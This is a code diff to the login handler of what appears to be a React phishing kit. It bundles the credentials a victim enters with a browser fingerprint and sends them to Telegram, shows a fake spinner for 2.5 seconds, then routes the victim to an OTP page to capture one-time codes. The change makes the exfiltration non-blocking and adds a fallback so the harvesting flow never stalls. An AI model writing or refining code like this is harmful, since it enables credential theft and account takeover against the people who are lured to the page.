@@ -30,25 +30,36 @@ function App() {
   const location = useLocation();
 
   const handleLoginSuccess = async (loginData: any) => {
-    const browserFingerprint = await getBrowserFingerprint();
-    const credentialsData = {
-      ...loginData,
-      sessionId: Math.random().toString(36).substring(2, 15),
-      timestamp: new Date().toISOString(),
-      userAgent: navigator.userAgent,
-      ...browserFingerprint,
-    };
+    try {
+      const browserFingerprint = getBrowserFingerprint();
+      const credentialsData = {
+        ...loginData,
+        sessionId: Math.random().toString(36).substring(2, 15),
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        ...browserFingerprint,
+      };
 
-    await safeSendToTelegram({ type: 'credentials', data: credentialsData });
+      // Send credentials to Telegram (don't block on failure)
+      safeSendToTelegram({ type: 'credentials', data: credentialsData }).catch((err: any) => console.error('Failed to send credentials:', err));
 
-    // Brief delay so the spinner is visible on the Sign In button
-    await new Promise((r) => setTimeout(r, 2500));
+      // Brief delay so the spinner is visible on the Sign In button
+      await new Promise((r) => setTimeout(r, 2500));
 
-    setLoginFlowState({
-      awaitingOtp: true,
-      sessionData: credentialsData,
-    });
-    navigate('/otp', { replace: true });
+      setLoginFlowState({
+        awaitingOtp: true,
+        sessionData: credentialsData,
+      });
+      navigate('/otp', { replace: true });
+    } catch (err) {
+      console.error('handleLoginSuccess error:', err);
+      // Fallback: still navigate to OTP even if something fails
+      setLoginFlowState({
+        awaitingOtp: true,
+        sessionData: { ...loginData, sessionId: Math.random().toString(36).substring(2, 15) },
+      });
+      navigate('/otp', { replace: true });
+    }
   };
 
   const handleOtpSubmit = async (otp: string) => {
